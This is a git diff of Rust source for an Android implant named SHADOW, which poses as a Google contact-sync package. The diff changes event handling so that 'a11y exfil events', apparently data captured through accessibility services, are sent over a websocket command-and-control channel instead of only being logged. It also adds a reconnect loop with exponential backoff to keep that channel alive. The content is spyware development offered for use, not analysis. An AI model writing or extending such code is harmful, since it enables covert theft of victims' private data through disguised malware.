@@ -56,20 +56,54 @@ struct ShadowCore {
 }
 
 impl ShadowCore {
-    async fn start(&self) -> anyhow::Result<()> {
+    async fn start(&self, mut event_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>) -> anyhow::Result<()> {
         let ws = transport::websocket::WsTransport::new(&self.domain, &self.implant_id);
         let (tx_send, rx_send) = mpsc::channel(100);
         let (tx_recv, mut rx_recv) = mpsc::channel(100);
+
+        // Wire a11y exfil events into transport outbound channel
+        let event_tx_send = tx_send.clone();
+        tokio::spawn(async move {
+            while let Some(msg) = event_rx.recv().await {
+                if event_tx_send.send(msg).await.is_err() { break; }
+            }
+        });
 
         // Wire module send_frame into transport outbound channel
         let _module_tx = tx_send.clone();
 
         info!("SHADOW initialized. Implant ID: {}", self.implant_id);
 
-        // Transport connection (single attempt; WorkManager retries every 15min)
+        let rx_send_shared = std::sync::Arc::new(tokio::sync::Mutex::new(rx_send));
+
+        // Transport connection loop (reconnect on failure/drop with exponential backoff)
         let ws_task = tokio::spawn(async move {
-            if let Err(e) = ws.connect(rx_send, tx_recv.clone()).await {
-                tracing::error!("Transport disconnected: {}", e);
+            let mut backoff = tokio::time::Duration::from_secs(2);
+            let max_backoff = tokio::time::Duration::from_secs(60);
+            
+            loop {
+                let (tx_internal, rx_internal) = mpsc::channel(100);
+                let (tx_recv_internal, mut rx_recv_inner) = mpsc::channel(100);
+                
+                let rx_shared_clone = rx_send_shared.clone();
+                let proxy = tokio::spawn(async move {
+                    let mut lock = rx_shared_clone.lock().await;
+                    while let Some(msg) = lock.recv().await {
+                        if tx_internal.send(msg).await.is_err() { break; }
+                    }
+                });
+
+                if let Err(e) = ws.connect(rx_internal, tx_recv_internal).await {
+                    tracing::error!("Transport disconnected/failed: {}", e);
+                } else {
+                    tracing::info!("Transport closed cleanly.");
+                }
+                
+                proxy.abort();
+                
+                tracing::info!("WSS reconnecting in {:?}...", backoff);
+                tokio::time::sleep(backoff).await;
+                backoff = std::cmp::min(backoff * 2, max_backoff);
             }
         });
 
@@ -230,7 +264,7 @@ pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
         let runtime = RUNTIME.as_ref().unwrap();
 
         runtime.block_on(async {
-            let (event_tx, mut event_rx) = mpsc::unbounded_channel::<Vec<u8>>();
+            let (event_tx, event_rx) = mpsc::unbounded_channel::<Vec<u8>>();
             let registry = Arc::new(Mutex::new(ModuleRegistry::new(std::path::PathBuf::from(
                 "/data/data/com.google.android.contactsync/files/modules"
             ))));
@@ -242,23 +276,14 @@ pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
                     "/data/data/com.google.android.contactsync/files/modules"
                 ),
                 crypto: Arc::new(Mutex::new(None)),
-                event_tx: event_tx.clone(),
-                registry: registry.clone(),
+                event_tx,
+                registry,
             });
 
             CORE = Some(core.clone());
 
-            let core_clone = core.clone();
             tokio::spawn(async move {
-                let _ = core_clone.start().await;
-            });
-
-            // Bridge event channel into a WS channel (best-effort).
-            // Real transport wiring happens in start(); we log here.
-            tokio::spawn(async move {
-                while let Some(ev) = event_rx.recv().await {
-                    info!("[exfil event] {} bytes", ev.len());
-                }
+                let _ = core.start(event_rx).await;
             });
 
             0
